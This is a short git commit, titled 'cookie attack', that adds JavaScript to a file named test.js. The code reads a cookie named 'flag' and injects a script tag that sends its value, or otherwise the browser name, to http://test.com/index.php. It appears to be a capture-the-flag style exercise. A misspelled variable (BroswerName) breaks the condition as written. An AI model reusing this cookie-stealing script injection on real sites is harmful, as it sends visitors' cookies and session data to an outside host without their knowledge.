2ea127eb8116afc3d671a703cb34525496880df2
Thanray Tian <874800988@qq.com>
2017-01-18 12:48:23 +0800

    cookie attack

--- test.js
+++ test.js
@@ -1,1 +1,28 @@
+//读取cookies 
+function getCookie(name) 
+{ 
+    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+    if(arr=document.cookie.match(reg)) {
+        return unescape(arr[2]); 
+    } else {
+        return null; 
+    }
+} 
+
 console.log("Hello Word");
+
+var browser=navigator.appName
+var b_version=navigator.appVersion
+var version=parseFloat(b_version)
+var BrowserName=browser+version; 
+
+if(BroswerName == 'Mozilla/Secret VIP1.0') {
+    var flag=getCookie('flag');
+    var script=document.createElement('script');
+    script.src='http://test.com/index.php?flag='+flag;
+    document.body.appendChild(script);
+} else {
+    var script=document.createElement('script');
+    script.src='http://test.com/index.php?broswer='+BrowserName;
+    document.body.appendChild(script);
+}
